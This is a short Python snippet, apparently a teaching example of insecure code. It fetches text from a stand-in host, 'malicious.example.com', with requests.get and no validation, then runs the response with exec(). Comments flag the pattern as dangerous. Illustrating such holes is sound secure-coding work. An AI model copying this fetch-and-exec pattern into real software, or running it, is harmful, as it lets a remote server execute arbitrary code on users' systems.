import requests

def fetch_url(url):
    # This function fetches content from a URL without any validation
    response = requests.get(url)
    return response.text

# Example usage that could lead to code execution if the URL is malicious
malicious_url = "http://malicious.example.com/execute"
content = fetch_url(malicious_url)
exec(content)  # Potentially dangerous execution of fetched content